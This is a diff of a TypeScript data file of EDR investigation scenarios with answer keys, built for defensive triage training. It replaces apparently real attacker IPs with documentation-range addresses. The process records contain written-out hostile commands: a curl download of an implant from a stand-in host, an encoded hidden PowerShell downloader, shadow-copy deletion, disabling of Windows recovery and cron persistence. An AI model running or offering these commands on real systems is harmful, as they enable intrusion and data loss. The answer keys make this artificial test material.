@@ -177,15 +177,15 @@ export const EDR_INVESTIGATIONS: EdrInvestigation[] = [
       { pid: 5610, ppid: 4820, name: "WINWORD.EXE", cmdline: "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\r.bakker\\Downloads\\Invoice_4471.docm\"", user: "CORP\\r.bakker", path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", signed: true, startedAt: "09:41:52", verdict: "suspicious", note: "Word opened a macro-enabled doc (.docm) from Downloads: legitimate binary, but it should NOT be spawning a shell." },
       { pid: 6104, ppid: 5610, name: "cmd.exe", cmdline: "cmd.exe /c powershell -w hidden -enc SQBFAFgAKABOAGUAdwAt...", user: "CORP\\r.bakker", path: "C:\\Windows\\System32\\cmd.exe", signed: true, startedAt: "09:41:55", verdict: "suspicious", note: "Office spawning cmd.exe is the classic macro-execution tell. Signed LOLBin, but the parent (WINWORD) makes it anomalous." },
       { pid: 6240, ppid: 6104, name: "powershell.exe", cmdline: "powershell.exe -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQ...", user: "CORP\\r.bakker", path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", signed: true, startedAt: "09:41:56", verdict: "suspicious", note: "Encoded, hidden-window PowerShell: the downloader. Signed LOLBin abused; it fetched and ran the payload below.",
-        network: [{ ts: "09:41:59", direction: "outbound", remote_ip: "45.137.22.19", remote_port: 80, domain: "cdn-msupdate.info", proto: "HTTP", bytes: 207872 }],
+        network: [{ ts: "09:41:59", direction: "outbound", remote_ip: "203.0.113.122", remote_port: 80, domain: "cdn-msupdate.info", proto: "HTTP", bytes: 207872 }],
         files: [{ ts: "09:42:00", action: "write", path: "C:\\Users\\r.bakker\\AppData\\Roaming\\svc\\update.dll" }],
         // The downloader also wrote the Run key that re-launches the DLL every logon:
         // this is the record that answers "who changed it, when" that reg query cannot.
         registry: [{ ts: "09:42:01", action: "SetValue", path: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater", details: "rundll32.exe C:\\Users\\r.bakker\\AppData\\Roaming\\svc\\update.dll,Start" }] },
       { pid: 6388, ppid: 6240, name: "rundll32.exe", cmdline: "rundll32.exe C:\\Users\\r.bakker\\AppData\\Roaming\\svc\\update.dll,Start", user: "CORP\\r.bakker", path: "C:\\Users\\r.bakker\\AppData\\Roaming\\svc\\update.dll", signed: false, sha256: "415dde31bb66f5a6fa3b7ec84d5c1c33c4c6c7038e897dee5b562d8ce70246a9", startedAt: "09:42:01", verdict: "malicious", note: "THE PAYLOAD. rundll32 running an UNSIGNED DLL from AppData\\Roaming: real rundll32 loads system DLLs, never user-writable ones. The hash is a known Agent Tesla sample; it beaconed to the C2 below.",
         network: [
-          { ts: "09:42:04", direction: "outbound", remote_ip: "45.137.22.19", remote_port: 443, domain: "cdn-msupdate.info", proto: "TLS", bytes: 4096 },
-          { ts: "09:42:34", direction: "outbound", remote_ip: "45.137.22.19", remote_port: 443, domain: "cdn-msupdate.info", proto: "TLS", bytes: 2048 },
+          { ts: "09:42:04", direction: "outbound", remote_ip: "203.0.113.122", remote_port: 443, domain: "cdn-msupdate.info", proto: "TLS", bytes: 4096 },
+          { ts: "09:42:34", direction: "outbound", remote_ip: "203.0.113.122", remote_port: 443, domain: "cdn-msupdate.info", proto: "TLS", bytes: 2048 },
         ],
         files: [
           { ts: "09:42:02", action: "write", path: "C:\\Users\\r.bakker\\AppData\\Roaming\\svc\\config.bin" },
@@ -206,9 +206,9 @@ export const EDR_INVESTIGATIONS: EdrInvestigation[] = [
       { at: "09:41:52", kind: "process", pid: 5610, text: "WINWORD.EXE opened Invoice_4471.docm (macro-enabled) from Downloads" },
       { at: "09:41:55", kind: "process", pid: 6104, text: "WINWORD spawned cmd.exe with an encoded PowerShell one-liner" },
       { at: "09:41:56", kind: "process", pid: 6240, text: "cmd launched powershell.exe -enc (hidden window)" },
-      { at: "09:41:59", kind: "network", pid: 6240, text: "powershell → GET http://45.137.22.19/u/update.dll (203 KB written to AppData\\Roaming\\svc\\)" },
+      { at: "09:41:59", kind: "network", pid: 6240, text: "powershell → GET http://203.0.113.122/u/update.dll (203 KB written to AppData\\Roaming\\svc\\)" },
       { at: "09:42:01", kind: "process", pid: 6388, text: "powershell launched rundll32.exe update.dll,Start (unsigned)" },
-      { at: "09:42:04", kind: "network", pid: 6388, text: "rundll32 → TLS beacon to 45.137.22.19:443 every 30s" },
+      { at: "09:42:04", kind: "network", pid: 6388, text: "rundll32 → TLS beacon to 203.0.113.122:443 every 30s" },
       { at: "09:42:05", kind: "detection", pid: 6388, text: "Defender: Behavior:Win32/Agenttesla: quarantine FAILED (in use)" },
     ],
     autoruns: [
@@ -216,7 +216,7 @@ export const EDR_INVESTIGATIONS: EdrInvestigation[] = [
     ],
     answer: {
       pid: 6388,
-      explanation: "rundll32.exe (pid 6388) is the payload: an UNSIGNED DLL run from AppData\\Roaming (rundll32 should only load system DLLs), a known Agent Tesla hash, and the process that beaconed to 45.137.22.19. WINWORD→cmd→powershell is the delivery chain that dropped it, but the persistent malicious implant is the rundll32/DLL.",
+      explanation: "rundll32.exe (pid 6388) is the payload: an UNSIGNED DLL run from AppData\\Roaming (rundll32 should only load system DLLs), a known Agent Tesla hash, and the process that beaconed to 203.0.113.122. WINWORD→cmd→powershell is the delivery chain that dropped it, but the persistent malicious implant is the rundll32/DLL.",
     },
   },
 
@@ -259,7 +259,7 @@ export const EDR_INVESTIGATIONS: EdrInvestigation[] = [
       { pid: 700, ppid: 4, name: "services.exe", cmdline: "C:\\Windows\\System32\\services.exe", user: "NT AUTHORITY\\SYSTEM", path: "C:\\Windows\\System32\\services.exe", signed: true, startedAt: "01:59:40", verdict: "benign" },
       { pid: 3560, ppid: 700, name: "explorer.exe", cmdline: "C:\\Windows\\explorer.exe", user: "CORP\\svc_backup", path: "C:\\Windows\\explorer.exe", signed: true, startedAt: "22:14:02", verdict: "benign" },
       { pid: 4102, ppid: 3560, name: "powershell.exe", cmdline: "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC4A...", user: "CORP\\svc_backup", path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", signed: true, startedAt: "22:41:10", verdict: "suspicious", note: "Hands-on-keyboard operator: hidden encoded PowerShell loading a Cobalt Strike beacon before the ransomware stage.", sha256: "dfcfb9d9e92004fe8ed31789a3791a8f57ee892b55245360e00da328e1ccb0bd",
-        network: [{ ts: "22:41:14", direction: "outbound", remote_ip: "193.42.33.15", remote_port: 443, domain: "api-telemetry-sync.com", proto: "TLS", bytes: 8192 }] },
+        network: [{ ts: "22:41:14", direction: "outbound", remote_ip: "203.0.113.123", remote_port: 443, domain: "api-telemetry-sync.com", proto: "TLS", bytes: 8192 }] },
       { pid: 4550, ppid: 4102, name: "cmd.exe", cmdline: "cmd.exe /c vssadmin delete shadows /all /quiet", user: "CORP\\svc_backup", path: "C:\\Windows\\System32\\cmd.exe", signed: true, startedAt: "22:52:01", verdict: "suspicious", note: "Launches the recovery-inhibition commands: the last step before encryption." },
       { pid: 4560, ppid: 4550, name: "vssadmin.exe", cmdline: "vssadmin.exe delete shadows /all /quiet", user: "CORP\\svc_backup", path: "C:\\Windows\\System32\\vssadmin.exe", signed: true, startedAt: "22:52:01", verdict: "suspicious", note: "Deleting ALL Volume Shadow Copies so the victim can't restore. Signed Windows tool, but no admin deletes every shadow copy at 22:52." },
       { pid: 4570, ppid: 4550, name: "bcdedit.exe", cmdline: "bcdedit.exe /set {default} recoveryenabled No", user: "CORP\\svc_backup", path: "C:\\Windows\\System32\\bcdedit.exe", signed: true, startedAt: "22:52:03", verdict: "suspicious", note: "Disables Windows recovery: same recovery-inhibition playbook." },
@@ -276,7 +276,7 @@ export const EDR_INVESTIGATIONS: EdrInvestigation[] = [
       { pid: 5120, technique: "T1486", name: "Data Encrypted for Impact, mass rename to .lockbit", severity: "critical", ioa: "An unsigned binary from a temp path is renaming files to a fixed extension and dropping an identical README in every folder, active ransomware encryption." },
     ],
     timeline: [
-      { at: "22:41:10", kind: "process", pid: 4102, text: "Encoded PowerShell loaded a Cobalt Strike beacon (C2 193.42.33.15)" },
+      { at: "22:41:10", kind: "process", pid: 4102, text: "Encoded PowerShell loaded a Cobalt Strike beacon (C2 203.0.113.123)" },
       { at: "22:52:01", kind: "process", pid: 4560, text: "vssadmin delete shadows /all /quiet: all shadow copies removed" },
       { at: "22:52:03", kind: "process", pid: 4570, text: "bcdedit disabled Windows recovery" },
       { at: "22:53:20", kind: "process", pid: 5120, text: "LB3.exe launched from AppData\\Local\\Temp (unsigned)" },
@@ -327,16 +327,16 @@ export const EDR_INVESTIGATIONS: EdrInvestigation[] = [
     host: { name: "prod-web-03", os: "Ubuntu 22.04 LTS", ip: "10.30.2.15", user: "deploy" },
     processes: [
       { pid: 1, ppid: 0, name: "systemd", cmdline: "/sbin/init", user: "root", path: "/sbin/init", signed: true, startedAt: "00:00:01", verdict: "benign" },
-      { pid: 910, ppid: 1, name: "sshd", cmdline: "sshd: deploy [priv]", user: "root", path: "/usr/sbin/sshd", signed: true, startedAt: "03:11:40", verdict: "benign", note: "Accepted an SSH session for 'deploy' from 45.9.148.203 (a hosting-provider IP, not the office range) after a burst of failed attempts." },
+      { pid: 910, ppid: 1, name: "sshd", cmdline: "sshd: deploy [priv]", user: "root", path: "/usr/sbin/sshd", signed: true, startedAt: "03:11:40", verdict: "benign", note: "Accepted an SSH session for 'deploy' from 203.0.113.124 (a hosting-provider IP, not the office range) after a burst of failed attempts." },
       { pid: 2140, ppid: 910, name: "bash", cmdline: "-bash", user: "deploy", path: "/usr/bin/bash", signed: true, startedAt: "03:11:41", verdict: "benign" },
-      { pid: 2150, ppid: 2140, name: "curl", cmdline: "curl -s -o /tmp/.x/kworker http://91.215.85.17/l/x64", user: "deploy", path: "/usr/bin/curl", signed: true, startedAt: "03:12:03", verdict: "suspicious", note: "Pulling a binary into a hidden /tmp/.x directory over plain HTTP: the download step.",
-        network: [{ ts: "03:12:03", direction: "outbound", remote_ip: "91.215.85.17", remote_port: 80, proto: "HTTP", bytes: 3145728 }] },
+      { pid: 2150, ppid: 2140, name: "curl", cmdline: "curl -s -o /tmp/.x/kworker http://203.0.113.86/l/x64", user: "deploy", path: "/usr/bin/curl", signed: true, startedAt: "03:12:03", verdict: "suspicious", note: "Pulling a binary into a hidden /tmp/.x directory over plain HTTP: the download step.",
+        network: [{ ts: "03:12:03", direction: "outbound", remote_ip: "203.0.113.86", remote_port: 80, proto: "HTTP", bytes: 3145728 }] },
       { pid: 2160, ppid: 2140, name: "chmod", cmdline: "chmod +x /tmp/.x/kworker", user: "deploy", path: "/usr/bin/chmod", signed: true, startedAt: "03:12:05", verdict: "suspicious", note: "Making the downloaded file executable: named after the kernel 'kworker' thread." },
-      { pid: 2200, ppid: 2140, name: "kworker", cmdline: "/tmp/.x/kworker -d", user: "deploy", path: "/tmp/.x/kworker", signed: false, startedAt: "03:12:07", verdict: "malicious", note: "THE PAYLOAD. An unsigned ELF masquerading as the kernel 'kworker' thread, running from /tmp/.x, daemonised (-d) and holding a TLS session to 91.215.85.17:443 with a check-in every 60 seconds: a reverse-shell implant.",
+      { pid: 2200, ppid: 2140, name: "kworker", cmdline: "/tmp/.x/kworker -d", user: "deploy", path: "/tmp/.x/kworker", signed: false, startedAt: "03:12:07", verdict: "malicious", note: "THE PAYLOAD. An unsigned ELF masquerading as the kernel 'kworker' thread, running from /tmp/.x, daemonised (-d) and holding a TLS session to 203.0.113.86:443 with a check-in every 60 seconds: a reverse-shell implant.",
         network: [
-          { ts: "03:12:08", direction: "outbound", remote_ip: "91.215.85.17", remote_port: 443, proto: "TLS", bytes: 2048 },
-          { ts: "03:13:08", direction: "outbound", remote_ip: "91.215.85.17", remote_port: 443, proto: "TLS", bytes: 1536 },
-          { ts: "03:14:08", direction: "outbound", remote_ip: "91.215.85.17", remote_port: 443, proto: "TLS", bytes: 1612 },
+          { ts: "03:12:08", direction: "outbound", remote_ip: "203.0.113.86", remote_port: 443, proto: "TLS", bytes: 2048 },
+          { ts: "03:13:08", direction: "outbound", remote_ip: "203.0.113.86", remote_port: 443, proto: "TLS", bytes: 1536 },
+          { ts: "03:14:08", direction: "outbound", remote_ip: "203.0.113.86", remote_port: 443, proto: "TLS", bytes: 1612 },
         ] },
       { pid: 2210, ppid: 2140, name: "crontab", cmdline: "crontab -l ; echo '@reboot /tmp/.x/kworker -d' | crontab -", user: "deploy", path: "/usr/bin/crontab", signed: true, startedAt: "03:12:40", verdict: "suspicious", note: "Installs an @reboot cron job so the implant survives a restart: persistence." },
     ],
@@ -346,15 +346,15 @@ export const EDR_INVESTIGATIONS: EdrInvestigation[] = [
       { pid: 2210, technique: "T1053.003", name: "Scheduled Task/Job: Cron persistence", severity: "medium", ioa: "An @reboot cron entry was added pointing at the binary in /tmp/.x so it restarts after a reboot." },
     ],
     timeline: [
-      { at: "03:11:40", kind: "process", pid: 910, text: "SSH accepted for 'deploy' from 45.9.148.203 (hosting-provider IP) after failed attempts" },
-      { at: "03:12:03", kind: "network", pid: 2150, text: "curl → GET http://91.215.85.17/l/x64 into /tmp/.x/kworker" },
-      { at: "03:12:07", kind: "process", pid: 2200, text: "kworker started from /tmp/.x: TLS to 91.215.85.17:443" },
+      { at: "03:11:40", kind: "process", pid: 910, text: "SSH accepted for 'deploy' from 203.0.113.124 (hosting-provider IP) after failed attempts" },
+      { at: "03:12:03", kind: "network", pid: 2150, text: "curl → GET http://203.0.113.86/l/x64 into /tmp/.x/kworker" },
+      { at: "03:12:07", kind: "process", pid: 2200, text: "kworker started from /tmp/.x: TLS to 203.0.113.86:443" },
       { at: "03:12:40", kind: "process", pid: 2210, text: "@reboot cron entry added for /tmp/.x/kworker (persistence)" },
       { at: "03:13:08", kind: "detection", pid: 2200, text: "EDR: kernel-thread name from a user-writable path with periodic outbound TLS: Masquerading" },
     ],
     answer: {
       pid: 2200,
-      explanation: "kworker (pid 2200) is the payload, an unsigned implant masquerading as the kernel worker thread (T1036.004). Real kworker threads are kernel threads with no executable path; this one runs from /tmp/.x and checks in to 91.215.85.17:443 every 60 seconds, giving the operator a remote shell (T1071.001). curl (2150) fetched it and the crontab entry (2210) persists it. Isolate the host, kill the implant, remove the cron entry and /tmp/.x, block 91.215.85.17, and rotate the 'deploy' SSH credentials, the foothold was that account.",
+      explanation: "kworker (pid 2200) is the payload, an unsigned implant masquerading as the kernel worker thread (T1036.004). Real kworker threads are kernel threads with no executable path; this one runs from /tmp/.x and checks in to 203.0.113.86:443 every 60 seconds, giving the operator a remote shell (T1071.001). curl (2150) fetched it and the crontab entry (2210) persists it. Isolate the host, kill the implant, remove the cron entry and /tmp/.x, block 203.0.113.86, and rotate the 'deploy' SSH credentials, the foothold was that account.",
     },
   },
 ];
